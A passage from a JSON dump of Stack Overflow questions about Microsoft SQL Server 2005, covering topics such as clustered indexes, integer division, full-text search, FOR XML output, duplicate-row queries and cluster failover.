join)?</p>\n\n<p>thanks</p>\n"},{"tags":["sql","sql-server","sql-server-2005","clustered-index"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":492,"score":4,"question_id":3350476,"title":"How to drop clustered property but retain primary key in a table. SQL Server 2005","body":"<p>i have the following key:</p>\n\n<pre><code>ALTER TABLE dbo.Table ADD  CONSTRAINT PK_ID PRIMARY KEY CLUSTERED \n(\nID ASC\n)\n</code></pre>\n\n<p>so i have clustered index and primary key on ID column.\nNow i need to drop clustered index (i want to create new clustered index on another column), but retain primary key.\nIs it possible?</p>\n"},{"tags":["xml","sql-server-2005","ssms","ntext"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":989,"score":2,"question_id":4955817,"title":"How to get complete data from SQL management studio for ntext column?","body":"<p>I am using SQL server 2005. In one of the tables, I have a column \"xmldefinition\" which is of ntext type. Now the data in this column is very huge and contains whole xml text.</p>\n\n<p>eg:- <code>&lt;root&gt;&lt;something1&gt;....&lt;/something1&gt;&lt;/root&gt;</code></p>\n\n<p>I want to get the whole string from management studio and copy it outside in a xml file just to go through the whole xml manually. But when I query for this column and I copy and paste the data into another file, the contents are broken in middle and it is not complete.</p>\n\n<p>eg:- <code>&lt;root&gt;&lt;something1&gt;........&lt;somechar</code></p>\n\n<p>I believe this will copy only some 8196 characters from xml data in column. So my question is, how do I get the complete data for this column manually. I can however write a C# code to read that column, but I want to do this manually in management studio. Any idea please.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":79,"score":2,"question_id":11315826,"title":"Calculating ratio only gives 0 or 1?","body":"<p>I have a section of T-SQL code that looks something like this:</p>\n\n<pre><code>select @automation_rate = \n  case \n    when @total_count = 0 then 0\n    else @automated_count / @total_count\n  end\n</code></pre>\n\n<p>@automation_rate is decimal(3,2). @total_count and @automated_count are integers.</p>\n\n<p>Unfortunately the only values ever returned for @automation_rate are either 0 or 1. Clearly there is something wrong here, and it may be ridiculously simple, but for the life of me I can't see it.</p>\n\n<p>All data in the underlying resultset (I'm looping over a table) is either 0 or a positive integer. All values are integers except for the automation rate. </p>\n\n<p>Here's example values and expected (using a calculator) vs actual results:</p>\n\n<pre><code>automated count     total count     expected ratio     actual ratio\n---------------     -----------     --------------     ------------\n              0              35                0.0             0.00\n             98             258              37.98             0.00\n             74             557              13.29             0.00\n            140             140               1.00             1.00\n</code></pre>\n\n<p>As you can see I get a ratio of 0.00 for all values except where automated = total. I also have an Excel spreadsheet that does the same basic calculation and it comes out perfect (i.e. just like the \"expected\" column) every time.</p>\n\n<p>So where did I go wrong?</p>\n\n<p><em>(This is on MS SQL Server 2005, on the off chance that has any impact at all)</em></p>\n\n<p><strong>Edit</strong> Thanks to everyone for the answers. I blew the integer rounding part by assuming since it was moving into a decimal data type that it would automatically convert, instead of realizing it would do the calculation, round, and <em>then</em> convert. Everyone had similar answers so upvotes all around.</p>\n"},{"tags":["sql-server-2008","sql-server-2005","vb6","connection-string"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":121,"score":0,"question_id":11313109,"title":"Failed connecting to server after migrating to SQL 2008","body":"<p>I am upgrading an old VB6 desktop app database from SQL 2005 to SQL 2008 R2.<br>\nThe app is failing to connect to the server. What do I need to change to connect to the new database?</p>\n"},{"tags":["sql-server","sql-server-2005","insert","identity","uniqueidentifier"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":1301,"score":4,"question_id":810829,"title":"Best way to get PK Guid of inserted row","body":"<p>I've read <a href=\"http://stackoverflow.com/questions/42648/best-way-to-get-identity-of-inserted-row\">this question</a> about getting the identity of an inserted row.  My question is sort of related.</p>\n\n<p>Is there a way to get the guid for an inserted row?  The table I am working with has a guid as the primary key (defaulted to newid), and I would like to retrieve that guid after inserting the row.</p>\n\n<p>Is there anything like <code>@@IDENTITY</code>, <code>IDENT_CURRENT</code> or <code>SCOPE_IDENTITY</code> for Guids?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":7,"up_vote_count":9,"down_vote_count":0,"view_count":17116,"score":9,"question_id":207309,"title":"SQL Query for Parent Child Relationship","body":"<p>I have db table with parent child relationship as:</p>\n\n<pre><code>NodeId    NodeName    ParentId\n------------------------------\n1         Node1       0\n2         Node2       0\n3         Node3       1\n4         Node4       1\n5         Node5       3\n6         Node6       5\n7         Node7       2\n</code></pre>\n\n<p>Here parentId = 0 means that it is a root level node. Now I want to write an SQL Query which will return child at all level of a parent category.</p>\n\n<p>e.g. for nodeId = 1, it should return 3, 4, 5, 6.</p>\n\n<p>I am using MS SQL Server 2005 </p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":11307821,"title":"In SQL Server 2005, how can I see when a table has been created?","body":"<p>Using Microsoft SQL Server 2005, is there any way to see when a table has been created?</p>\n\n<p>And is there any way to see when was done the last <code>INSERT</code> in a table?</p>\n\n<p>And what about the last <code>ALTER TABLE</code> date?</p>\n\n<p>Thank you in advance for your kind cooperation.</p>\n"},{"tags":["sql","sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":11243254,"title":"SQL Server 2005 - optimizing stored procedures","body":"<p>I have 2 stored procedures (<code>sp1</code> and <code>sp2</code>) in SQL Server 2005 with the same sql script (no diff at all but the name).</p>\n\n<p>When I try to execute <code>sp1</code> it returns more than 3000 rows as result, in 0-1 secs.\nBut when I run <code>sp2</code> it will return those 3000 rows in 10 seconds.  </p>\n\n<p>Would like to know is there any tool/command/anything which can set a specific stored procedure to optimize well?</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server","sql-server-2005","full-text-search","fulltext","full-text-indexing"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1360,"score":2,"question_id":2781548,"title":"SQL Server Fulltext search yields no results","body":"<p>I have SQL Server 2005 Express Edition with Advanced Services. I enabled FullText and created a catalog as follows:</p>\n\n<pre><code>create FullText catalog MyDatabase_FT in path 'mypath' as default\n</code></pre>\n\n<p>I then created a FullText index as follows:</p>\n\n<pre><code>create FullText index on Cell (CellName) key index PK_Cell\n    with CHANGE_TRACKING AUTO\n</code></pre>\n\n<p>I executed the following queries:</p>\n\n<pre><code>1) select count(*) from Cell where contains (CellName, 'CU*')\n2) select count(*) from Cell where CellName like 'CU%'\n</code></pre>\n\n<p>And got the following results:</p>\n\n<p>1) 0<br>\n2) 24</p>\n\n<p>I realize that it could take some time to populate the FullText indexes. However, despite much time (12 hours) I still get no results. I then investigated further using the ObjectPropertyEx() function and executed the following:</p>\n\n<pre><code>declare @id int\nselect @id = id FROM sys.sysobjects where [Name] = 'Cell'\nselect 'TableFullTextBackgroundUpdateIndexOn' as 'Property', objectpropertyex(@id, 'TableFullTextBackgroundUpdateIndexOn') as 'Value'\nunion select 'TableFullTextChangeTrackingOn', objectpropertyex(@id, 'TableFullTextChangeTrackingOn')\nunion select 'TableFulltextDocsProcessed', objectpropertyex(@id, 'TableFulltextDocsProcessed') \nunion select 'TableFulltextFailCount', objectpropertyex(@id, 'TableFulltextFailCount') \nunion select 'TableFulltextItemCount', objectpropertyex(@id, 'TableFulltextItemCount') \nunion select 'TableFulltextKeyColumn', objectpropertyex(@id, 'TableFulltextKeyColumn') \nunion select 'TableFulltextPendingChanges', objectpropertyex(@id, 'TableFulltextPendingChanges') \nunion select 'TableHasActiveFulltextIndex', objectpropertyex(@id, 'TableHasActiveFulltextIndex') \n</code></pre>\n\n<p>This gave the following results:</p>\n\n<p>TableFullTextBackgroundUpdateIndexOn    1<br>\nTableFullTextChangeTrackingOn   1<br>\nTableFulltextDocsProcessed  11024<br>\nTableFulltextFailCount  0<br>\nTableFulltextItemCount  4038<br>\nTableFulltextKeyColumn  1<br>\nTableFulltextPendingChanges 0<br>\nTableHasActiveFulltextIndex 1  </p>\n\n<p>I then tried to do a fresh full population of the index as follows:</p>\n\n<pre><code>alter fulltext index on Cell start full population\n</code></pre>\n\n<p>And I get the following warning:</p>\n\n<p><code>Warning: Request to start a full-text index population on table or indexed view 'Cell' is ignored because a population is currently active for this table or indexed view.</code></p>\n\n<p>I tried an update population as follows:</p>\n\n<pre><code>alter fulltext index on Cell start update population\n</code></pre>\n\n<p>This returned: \"Command(s) completed successfully.\", however I still get no results on the FullText search.</p>\n\n<p>What am I missing? What do I need to do to get the FullText search working?</p>\n\n<p>Thanks, Elan</p>\n"},{"tags":["php","sql","sql-server","sql-server-2005","connection"],"answer_count":4,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":10800,"score":4,"question_id":469964,"title":"Unable to connect to msSQL database via PHP","body":"<p>I am using the current code in attempt to access a msSQL 2005 db:</p>\n\n<pre><code>&lt;?php\n$myServer = \"[server]\";\n$myUser = \"[username]\";\n$myPass = \"[password]\";\n$myDB = \"[db]\";\n\n//connection to the database\n$dbhandle = mssql_connect($myServer, $myUser, $myPass)\n  or die(\"Couldn't connect to SQL Server on $myServer\");\n\n//select a database to work with\n$selected = mssql_select_db($myDB, $dbhandle)\n  or die(\"Couldn't open database $myDB\");\n\n//declare the SQL statement that will query the database\n$query = \"SELECT id, name, year \";\n$query .= \"FROM cars \";\n$query .= \"WHERE name='BMW'\";\n\n//execute the SQL query and return records\n$result = mssql_query($query);\n\n$numRows = mssql_num_rows($result);\necho \"&lt;h1&gt;\" . $numRows . \" Row\" . ($numRows == 1 ? \"\" : \"s\") . \" Returned &lt;/h1&gt;\";\n\n//display the results\nwhile($row = mssql_fetch_array($result))\n{\n  echo \"&lt;li&gt;\" . $row[\"id\"] . $row[\"name\"] . $row[\"year\"] . \"&lt;/li&gt;\";\n}\n//close the connection\nmssql_close($dbhandle);\n?&gt;\n</code></pre>\n\n<p>It is returning the following:</p>\n\n<pre><code>Warning: mssql_connect() [function.mssql-connect]: Unable to connect to server: XXXXXXX in D:\\xxxxx.xxx\\xxxx.php on line 16\nCouldn't connect to SQL Server on XXXXXXX\n</code></pre>\n\n<p>What do you think the problem is?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1791,"score":3,"question_id":2432612,"title":"SQL and multiple statements in stored procedure","body":"<p>I'm working on SQL server 2005 and I have a very simple stored procedure:</p>\n\n<pre><code>create PROCEDURE [dbo].[tblTabel_Insert] \n@ID int,\n@Code nvarchar(50) = null\nAS\n    SET NOCOUNT ON;\n\n  IF  EXISTS (SELECT ID, code FROM tblTabel WHERE ID = @ID and code = @Code) \n    UPDATE tblTabel SET ID = @ID,code = @Code WHERE ID = @ID\n\nELSE\nBEGIN\n\nINSERT INTO tblTabel (ID,code) VALUES ( @ID ,@Code);\nEND\n</code></pre>\n\n<p>My question is: is it posible to have multiple queries in my stored procedure ?\nI want to add the lines </p>\n\n<pre><code>UPDATE tblTabelB SET ID = @ID,code = @Code WHERE ID = @ID\nUPDATE tblTabelC SET ID = @ID,code = @Code WHERE ID = @ID\n</code></pre>\n\n<p>in my if exists section. How do I change my stored procedure in the correct way ?</p>\n"},{"tags":["sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":89,"score":1,"question_id":11303577,"title":"How to aggregate string data in T-SQL","body":"<p>I have a table of data:</p>\n\n<pre><code>|Key|Field |DateField |\n|A  |Value1|2012-06-01|\n|A  |Value2|2012-06-02|\n|A  |Value3|2012-06-03|\n|B  |Value4|2012-06-04|\n|B  |Value5|2012-06-05|\n</code></pre>\n\n<p>I want to aggregate this string data by key - like in a group but I can't work out how.\nWhat I want to end up with is:</p>\n\n<pre><code>|Key|Field Aggregate       |\n|A  |Value1, Value2, Value3|\n|B  |Value4, Value5        |\n</code></pre>\n\n<p>Better still would be to end up with the sequence position inserted into the aggregation where the order of the sequence is determined by the order of the corresponding date field.</p>\n\n<pre><code>|Key|Field Aggregate                |\n|A  |1: Value1, 2: Value2, 3: Value3|\n|B  |1: Value4, 2: Value5           |\n</code></pre>\n\n<p>This seems like something I could do with a Common Table Expression, but I don't seem to be able to work out how.</p>\n\n<p>I wouldn't ordinarily perform this kind of operation in SQL - I'd normally pull the data into an app and manipulate it as necessary in code. </p>\n\n<p>Unfortunately this does not appear to be an option in this instance.</p>\n\n<p>How can I do this in SQL Server 2005 T-SQL.</p>\n\n<p>Is a CTE the right approach? Is there something more appropriate?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":468,"score":1,"question_id":11301846,"title":"SQL UPDATE statement combining multiple rows into one column","body":"<p>I'm working with airline data, so I have a query like this</p>\n\n<pre><code>SELECT Invoices.PNR, Segments.Depart, Segments.Arrival, Segments.DepartDateTime\nFROM Invoices AS i INNER JOIN Segments AS s\nON i.Invoice_ID = s.Invoice_ID`\nWHERE PNR = 'AAAAAA'\n</code></pre>\n\n<p>This returns</p>\n\n<pre><code>PNR    Depart Arrival DepartDateTime\nAAAAAA DFW    MCI     7/2/2012 7:30 AM\nAAAAAA MCI    LAX     7/2/2012 11:30 AM\nAAAAAA LAX    DFW     7/4/2012 2:30 PM\n</code></pre>\n\n<p>I have a column in Invoices called routing that I want to show 'DFW-MCI-LAX-DFW' Is this possible using a SQL only method ? The segments are listed in order, so DFW-MCI is first then MCI-LAX then LAX-DFW.</p>\n\n<p>EDIT: If I could update the database with DFW-MCI-MCI-LAX-LAX-DFW that is perfectly acceptable. I can strip out the duplicate entries on the view layer.</p>\n\n<p>I can easily write this in ColdFusion, but the looping and thousands of database updates takes forever. I could also do a mass update for every 100 records, but I'd like to avoid using anything other than SQL altogether</p>\n"},{"tags":["xml","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":11300208,"title":"selecting data as XML from sql server","body":"<p>I am trying to export data from an emailing system in the format of XML. how do i get the attachment part of my xml output from my SQL code to be self containing and not contain user data inside the attachment XMl node?</p>\n\n<pre><code>SELECT   \n   Message.Subject AS Subject,  \n   Message.Body AS Body,  \n   Message.crDate AS MessageCreationDate,  \n   MessageDetail.IsRead AS isRead,  \n   MessageDetail.ReadDate AS ReadDate,  \n-- attachment data\n   AttachmentDetail.Name AS AttachmentName,\n   AttachmentDetail.Size AS AttachmentSize,\n\n   [User].id AS SMC_USER_ID,  \n   [User].UFID AS OnlineClientIdentifier,  \n   [User].UserType AS UserType,  \n   [User].Segment AS Online_User_Segment,  \n   Recipient.RecipientTypeId,  \n   UPPER(RecipientType.Type) AS RecipientType,  \n   REPLACE(Recipient.EmailAddress, '#', [User].Id) AS     EmailAddress,  \n   Recipient.FriendlyName \n\n  FROM [Message]     WITH (NOLOCK)  \n  LEFT OUTER JOIN MessageDetail ON MessageDetail.MessageId =  Message.id  \n  LEFT OUTER JOIN [User] ON [User].Id = MessageDetail.UserId  \n  LEFT OUTER JOIN MessageRecipient Recipient ON Recipient.MessageId = Message.id   \n  LEFT OUTER JOIN MessageRecipient mr2 on mr2.MessageId = Recipient.MessageId  \n  LEFT OUTER JOIN RecipientType ON Recipient.RecipientTypeId = RecipientType.Id   \n  LEFT OUTER JOIN MessageAttachment ON MessageAttachment.MessageId = Message.id  \n  LEFT OUTER JOIN AttachmentDetail ON AttachmentDetail.AttachmentId = MessageAttachment.AttachmentId  \n  FOR XML AUTO, ELEMENTS , root('data')  \n</code></pre>\n\n<p>Here is the xml result that i want to have adjusted </p>\n\n<pre><code>&lt;data&gt;\n  &lt;Message&gt;\n    &lt;MessageId&gt;105&lt;/MessageId&gt;\n    &lt;Subject&gt;FW: new test image&lt;/Subject&gt;\n    &lt;Body&gt;hi world&lt;/Body&gt;\n    &lt;MessageCreationDate&gt;2012-06-21T07:14:29.783&lt;/MessageCreationDate&gt;\n    &lt;MessageDetail&gt;\n      &lt;isRead&gt;1&lt;/isRead&gt;\n      &lt;ReadDate&gt;2012-06-21T07:15:15.950&lt;/ReadDate&gt;\n      &lt;AttachmentDetail&gt;\n        &lt;AttachmentName&gt;image002.jpg&lt;/AttachmentName&gt;\n        &lt;AttachmentSize&gt;17759&lt;/AttachmentSize&gt;\n        &lt;AttachmentMIMEType&gt;image/jpeg&lt;/AttachmentMIMEType&gt;\n\n        &lt;User&gt;\n          &lt;SMC_USER_ID&gt;100005&lt;/SMC_USER_ID&gt;\n          &lt;OnlineClientIdentifier&gt;UserTest&lt;/OnlineClientIdentifier&gt;\n          &lt;UserType&gt;&lt;/UserType&gt;\n          &lt;Online_User_Segment&gt;default&lt;/Online_User_Segment&gt;\n          &lt;Recipient&gt;\n            &lt;RecipientTypeId&gt;1&lt;/RecipientTypeId&gt;\n            &lt;RecipientType&gt;FROM&lt;/RecipientType&gt;\n            &lt;EmailAddress&gt;srividya.iyer@ml.com&lt;/EmailAddress&gt;\n            &lt;FriendlyName&gt;Iyer, Srividya&lt;/FriendlyName&gt;\n          &lt;/Recipient&gt;\n          &lt;Recipient&gt;\n            &lt;RecipientTypeId&gt;1&lt;/RecipientTypeId&gt;\n            &lt;RecipientType&gt;FROM&lt;/RecipientType&gt;\n            &lt;EmailAddress&gt;srividya.iyer@ml.com&lt;/EmailAddress&gt;\n            &lt;FriendlyName&gt;Iyer, Srividya&lt;/FriendlyName&gt;\n          &lt;/Recipient&gt;\n          &lt;Recipient&gt;\n            &lt;RecipientTypeId&gt;2&lt;/RecipientTypeId&gt;\n            &lt;RecipientType&gt;TO&lt;/RecipientType&gt;\n            &lt;EmailAddress&gt;smc_ide+100010@ml-smc.com&lt;/EmailAddress&gt;\n            &lt;FriendlyName&gt;GREGORY AMOROSO&lt;/FriendlyName&gt;\n          &lt;/Recipient&gt;\n          &lt;Recipient&gt;\n            &lt;RecipientTypeId&gt;2&lt;/RecipientTypeId&gt;\n            &lt;RecipientType&gt;TO&lt;/RecipientType&gt;\n            &lt;EmailAddress&gt;smc_ide+100010@ml-smc.com&lt;/EmailAddress&gt;\n            &lt;FriendlyName&gt;GREGORY AMOROSO&lt;/FriendlyName&gt;\n          &lt;/Recipient&gt;\n        &lt;/User&gt;\n      &lt;/AttachmentDetail&gt;\n    &lt;/MessageDetail&gt;\n  &lt;/Message&gt;\n&lt;/data&gt;\n</code></pre>\n\n<p>I don't want <code>&lt;AttachmentDetail&gt;</code> to include data outside the actual attachment data. How can I get the <code>&lt;/AttachmentDetail&gt;</code> (closing tag) right after the attachment data itself?</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":260,"score":0,"question_id":11297901,"title":"Msg 102, Level 15, State 1,","body":"<p>I wrote following stored procedure in SQL Server 2005 and I get error message:</p>\n\n<blockquote>\n  <p>Msg 102, Level 15, State 1, Procedure sp_InsertCustTrans, Line 12<br>\n  Incorrect syntax near '@TrID'.</p>\n</blockquote>\n\n<p>My stored procedure is:</p>\n\n<pre><code>ALTER PROCEDURE [dbo].[sp_InsertCustTrans] \n-- Add the parameters for the stored procedure here\n@CuID int, @TrType nvarchar(10), @TrAmt int\nAS\nBEGIN\nSET NOCOUNT ON;\n    declare @TrID int;\n    Select @TrID = MAX(TransactionID) from CustTrans;\n    if Isnull(@TrID)\n        @TrID = @TrID + 1\n    else\n        @TrID = 1\n\n-- Insert statements for procedure here\nif (@TrType = 'Deposit')\n    begin\n        INSERT INTO CustTrans (TransactionID, TransactionDate, CustID, TransactonType, CreditAmount)\n            Values(@TrID, GetDate(), @CuID, @TrType, @TrAmt);\n    end\nelse\n    begin\n        INSERT INTO CustTrans (TransactionID, TransactionDate, CustID, TransactonType, DebitAmount)\n            Values(@TrID, GetDate(), @CuID, @TrType, @TrAmt);\n    end\nEND\nGO\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","ssms"],"answer_count":2,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":1430,"score":4,"question_id":940066,"title":"To Find the registry of SQL Server 2005 Management Studio","body":"<p>i want the registry value SQL Server 2005 Management Studio (because our application is dependent;) before installing our application i am checking whether SQL Server 2005 Management Studio is present or not and i have cross checked that for SQL Server Management Studio with Express Edition it is having different registry value and for SQL Server Management Studio Developer Edition it is having different registry value;\nAll i want is a common registry for SQL Server 2005 Management Studio so that i can check it before installation of my product.</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":124,"score":0,"question_id":11296739,"title":"Incorrect syntax near ',' ","body":"<pre><code>INSERT INTO [Temp].[dbo].[Student]\n    ([Fname], [Lname], [Gender])\n    VALUES \n    (N'Aname', N'Alname', N'Male')\n    GO\n</code></pre>\n\n<p>This codes workes fine but when I try to add multiple values it gives me an error</p>\n\n<pre><code>USE TEMP\nGO\n\nINSERT INTO [Temp].[dbo].[Student]\n([Fname], [Lname], [Gender])\nVALUES \n(N'Aname', N'Alname', N'Male'),\n(N'Bname', N'Blname', N'Male')\nGO\n</code></pre>\n\n<p><strong>Error: Incorrect syntax near ','.</strong></p>\n\n<p>Thanks for help!</p>\n"},{"tags":["sql-server-2005","cluster-computing","cpu-usage"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":324,"score":0,"question_id":1723467,"title":"Microsoft SQL 2005 active cluster node has 100% CPU load after clustering","body":"<p>Before moving to the SQL Server 2005 cluster we had on avarage 60% CPU load. After moving to active/passive cluster (with the exactly same hardware), the load on active node CPU is becoming 100% and after a while time-outs are comming from our web application. Any ideas what could be a couse?</p>\n\n<p>Additional info:\nOS: Windows Server 2008 Enterprise;\nSQL: SQL Server 2005 SP3 Enterprise;\nBoth nodes has exactly the same hardware</p>\n"},{"tags":["sql-server-2005","windows-server-2008","cluster-computing","failover"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":543,"score":0,"question_id":2103906,"title":"Troubleshooting failover cluster problem in W2K8 / SQL05","body":"<p>I have an active/passive W2K8 (64) cluster pair, running SQL05 Standard. Shared storage is on a HP EVA SAN (FC). </p>\n\n<p>I recently expanded the filesystem on the active node for a database, adding a drive designation. The shared storage drives are designated as F:, I:, J:, L: and X:,  with SQL filesystems on the first 4 and X: used for a backup destination.</p>\n\n<p>Last night, as part of a validation process (the passive node had been offline for maintenance), I moved the SQL instance to the other cluster node. The database in question immediately moved to Suspect status. </p>\n\n<p>Review of the system logs showed that the database would not load because the file \"K:\\SQLDATA\\whatever.ndf\" could not be found. (Note that we <em>do not have</em> a K: drive designation.) </p>\n\n<p>A review of the J: storage drive showed <em>zero</em> contents -- nothing -- this is where \"whatever.ndf\" should have been.</p>\n\n<p>Hmm, I thought. Problem with the server. I'll just move SQL back to the other server and figure out what's wrong..</p>\n\n<p><em>Still</em> no database. Suspect. Uh-oh. \"Whatever.ndf\" had gone into the bit bucket.</p>\n\n<p>I finally decided to just restore from the backup (which had been taken immediately before the validation test), so nothing was lost but a few hours of sleep.</p>\n\n<p>The question: (1) Why did the passive node think the whatever.ndf files were supposed to go to drive \"K:\", when <em>this drive didn't exist as a resource on the active node</em>?</p>\n\n<p>(2) How can I get the cluster nodes \"re-syncd\" so that failover can be accomplished? </p>\n\n<p>I don't know that there wasn't a \"K:\" drive as a cluster resource at some time in the past, but I do know that this drive did <em>not</em> exist on the original cluster at the time of resource move. </p>\n"},{"tags":["sql","sql-server","database","sql-server-2008","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":10982670,"title":"Drop Master Key keeps on running","body":"<p>I am trying to drop master key of the database, but everytime I run the below sql</p>\n\n<pre><code>DROP MASTER KEY\n</code></pre>\n\n<p>The query keeps on executing and never completes.</p>\n"},{"tags":["windows","sql-server-2005","cluster-computing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":2974997,"title":"I want to do some experiment on SQL Server cluster to gain some experience on it, where should I start?","body":"<p>I want to do some experiment on <strong>SQL Server cluster</strong> to gain some experience on it, where should I start? I just have some basic concept of cluster and don't have any experience. Anyone can tell me some material that I can reference to? Great thanks.</p>\n"},{"tags":["asp.net","sql-server-2005","linq-to-sql","timestamp"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":329,"score":0,"question_id":11289114,"title":"How to add Timestamp value in SQL Server 2005 by using LINQ","body":"<p>My database table have a <strong>Timestamp column named as inTime</strong> and i am using LINQ for insert, update data in SQL server. Now i want to add the timestamp value in my database but i don't know how to insert?</p>\n\n<pre><code> spaBL.attendance obj = new spaBL.attendance();\n            obj.FK_employeeId = 1;\n            obj.inTime =[what to write here??]\n</code></pre>\n\n<p><strong>inTime is of timestamp type.</strong></p>\n"},{"tags":["sql-server","sql-server-2005","duplicates"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":80,"score":1,"question_id":11281892,"title":"How to find detailed duplicated records","body":"<p>I need to retrieve all information about records that are duplicates for specific fields.</p>\n\n<p>If I would use mysql I could solve in this way:</p>\n\n<pre><code>drop table if exists test;\n\ncreate table test (\nid int not null auto_increment primary key,\nsurname varchar(50),\nfirstname varchar(50),\nsex char(1),\ndob date,\npob varchar(50),\notherfield1 varchar(50),\notherfield2 varchar(50)\n) engine = myisam;\n\n\ninsert into test (surname,firstname,sex,dob,pob,otherfield1,otherfield2)\nvalues \n('smith','john','M','2000-01-01','rome','xxx','yyy'),\n('black','jack','M','1990-12-30','milan','aaaaa','vvvv'),\n('smith','john','M','2000-01-01','rome','zzz','aaaaa'),\n('white','mike','M','1980-03-01','naples','zzz','other text'),\n('white','mike','M','1980-03-01','naples','zzz','foo bar'),\n('smith','ann','F','1992-03-05','turin','aaaaaaa','other text');\n\n\nselect * from test where (surname,firstname,sex,dob,pob) in (\nselect \nsurname,firstname,sex,dob,pob\nfrom test\ngroup by surname,firstname,sex,dob,pob\nhaving count(*) &gt; 1\n)  \n</code></pre>\n\n<p>and I'll get </p>\n\n<pre><code>\"id\"    \"surname\"   \"firstname\" \"sex\"   \"dob\"            \"pob\"  \"otherfield1\"   \"otherfield2\"\n\"1\" \"smith\"           \"john\"    \"M\" \"2000-01-01\"    \"rome\"     \"xxx\"    \"yyy\"\n\"3\" \"smith\"           \"john\"    \"M\" \"2000-01-01\"    \"rome\"     \"zzz\"    \"aaaaa\"\n\"4\" \"white\"           \"mike\"    \"M\" \"1980-03-01\"    \"naples\"   \"zzz\"    \"other text\"\n\"5\" \"white\"           \"mike\"    \"M\" \"1980-03-01\"    \"naples\"   \"zzz\"    \"foo bar\"\n</code></pre>\n\n<p>However this method doesn't work with mssql 2005:</p>\n\n<pre><code>create table #test (\nid int identity,\nsurname varchar(50),\nfirstname varchar(50),\nsex char(1),\ndob datetime,\npob varchar(50),\notherfield1 varchar(50),\notherfield2 varchar(50)\n)\n\ninsert into #test (surname,firstname,sex,dob,pob,otherfield1,otherfield2) values ('smith','john','M','2000-01-01','rome','xxx','yyy');\ninsert into #test (surname,firstname,sex,dob,pob,otherfield1,otherfield2) values ('black','jack','M','1990-12-30','milan','aaaaa','vvvv');\ninsert into #test (surname,firstname,sex,dob,pob,otherfield1,otherfield2) values ('smith','john','M','2000-01-01','rome','zzz','aaaaa');\ninsert into #test (surname,firstname,sex,dob,pob,otherfield1,otherfield2) values ('white','mike','M','1980-03-01','naples','zzz','other text');\ninsert into #test (surname,firstname,sex,dob,pob,otherfield1,otherfield2) values ('white','mike','M','1980-03-01','naples','zzz','foo bar');\ninsert into #test (surname,firstname,sex,dob,pob,otherfield1,otherfield2) values ('smith','ann','F','1992-03-05','turin','aaaaaaa','other text');\n\nselect * from #test where (surname,firstname,sex,dob,pob) in (\nselect \nsurname,firstname,sex,dob,pob\nfrom #test\ngroup by surname,firstname,sex,dob,pob\nhaving count(*) &gt; 1\n) \n</code></pre>\n\n<p>Thanks in advance.</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>This is a possible solution I've found:</p>\n\n<pre><code>select t1.* from #test as t1\ninner join (select \n            surname,firstname,sex,dob,pob\n            from #test\n            group by surname,firstname,sex,dob,pob\n            having count(*) &gt; 1) as t2\non t1.surname = t2.surname and t1.firstname = t2.firstname and t1.sex = t2.sex and t1.dob = t2.dob and t1.pob = t2.pob\n</code></pre>\n\n<p>but I'd like to know if there is a better way. I don't like to join all these conditions.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":105,"score":2,"question_id":11280833,"title":"Where clause in joins vs Where clause in Sub Query","body":"<h2>DDL</h2>\n\n<pre><code>create table t\n(\n    id int Identity(1,1),\n    nam varchar(100)\n)\n\n\ncreate table t1\n(\n    id int Identity(1,1),\n    nam varchar(100)\n)\n</code></pre>\n\n<hr>\n\n<h2>DML</h2>\n\n<pre><code>Insert into t( nam)values( 'a')\nInsert into t( nam)values( 'b')\nInsert into t( nam)values( 'c')\nInsert into t( nam)values( 'd')\nInsert into t( nam)values( 'e')\nInsert into t( nam)values( 'f')\n\n\nInsert into t1( nam)values( 'aa')\nInsert into t1( nam)values( 'bb')\nInsert into t1( nam)values( 'cc')\nInsert into t1( nam)values( 'dd')\nInsert into t1( nam)values( 'ee')\nInsert into t1( nam)values( 'ff')\n</code></pre>\n\n<hr>\n\n<h2>Query - 1</h2>\n\n<pre><code>Select t.*, t1.* From t t\nInner join t1 t1 on t.id = t1.id\nWhere t.id = 1\n</code></pre>\n\n<h2>Query 